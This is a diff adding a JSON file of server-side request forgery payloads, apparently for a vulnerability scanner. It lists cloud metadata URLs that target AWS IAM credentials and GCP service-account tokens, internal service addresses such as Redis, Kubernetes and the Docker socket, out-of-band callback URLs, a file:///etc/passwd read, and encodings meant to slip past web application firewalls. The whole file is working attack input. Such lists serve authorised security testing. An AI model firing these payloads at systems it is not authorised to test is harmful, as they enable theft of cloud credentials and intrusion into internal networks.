@@ -1,0 +1,41 @@
+{
+  "vulnerability": "Server-Side Request Forgery",
+  "category": "ssrf",
+  "dialects": {
+    "aws_metadata": [
+      {"name": "AWS IMDSv1 Metadata", "type": "cloud_metadata", "payload": "http://169.254.169.254/latest/meta-data/", "oast": false},
+      {"name": "AWS IMDSv1 IAM Creds", "type": "cloud_metadata", "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "oast": false},
+      {"name": "AWS IMDSv2 Token", "type": "cloud_metadata", "payload": "http://169.254.169.254/latest/api/token", "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, "method": "PUT", "oast": false}
+    ],
+    "gcp_metadata": [
+      {"name": "GCP Metadata", "type": "cloud_metadata", "payload": "http://metadata.google.internal/computeMetadata/v1/", "headers": {"Metadata-Flavor": "Google"}, "oast": false},
+      {"name": "GCP Service Account", "type": "cloud_metadata", "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "headers": {"Metadata-Flavor": "Google"}, "oast": false}
+    ],
+    "azure_metadata": [
+      {"name": "Azure Metadata", "type": "cloud_metadata", "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "headers": {"Metadata": "true"}, "oast": false}
+    ],
+    "alibaba_metadata": [
+      {"name": "Alibaba Metadata", "type": "cloud_metadata", "payload": "http://100.100.100.200/latest/meta-data/", "oast": false}
+    ],
+    "internal_services": [
+      {"name": "Localhost HTTP", "type": "internal", "payload": "http://localhost:8080/", "oast": false},
+      {"name": "Localhost HTTPS", "type": "internal", "payload": "https://localhost:8443/", "oast": false},
+      {"name": "Loopback HTTP", "type": "internal", "payload": "http://127.0.0.1:80/", "oast": false},
+      {"name": "Redis", "type": "internal", "payload": "http://127.0.0.1:6379/", "oast": false},
+      {"name": "Elasticsearch", "type": "internal", "payload": "http://127.0.0.1:9200/", "oast": false},
+      {"name": "Kubernetes API", "type": "internal", "payload": "https://kubernetes.default.svc/", "oast": false},
+      {"name": "Docker Socket", "type": "internal", "payload": "http://unix:/var/run/docker.sock:/", "oast": false}
+    ],
+    "oast": [
+      {"name": "SSRF DNS Callback HTTP", "type": "oast", "payload": "http://{oast_id}.oast.fun/ssrf", "oast": true},
+      {"name": "SSRF DNS Callback HTTPS", "type": "oast", "payload": "https://{oast_id}.oast.fun/ssrf", "oast": true},
+      {"name": "SSRF File Protocol", "type": "oast", "payload": "file:///etc/passwd", "oast": false}
+    ],
+    "waf_bypass": [
+      {"name": "DNS Rebinding", "type": "waf_bypass", "payload": "http://127.0.0.1.nip.io:8080/", "oast": false},
+      {"name": "URL Encoding", "type": "waf_bypass", "payload": "http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/", "oast": false},
+      {"name": "IPv6 Localhost", "type": "waf_bypass", "payload": "http://[::1]:8080/", "oast": false},
+      {"name": "Decimal IP", "type": "waf_bypass", "payload": "http://2130706433:8080/", "oast": false}
+    ]
+  }
+}
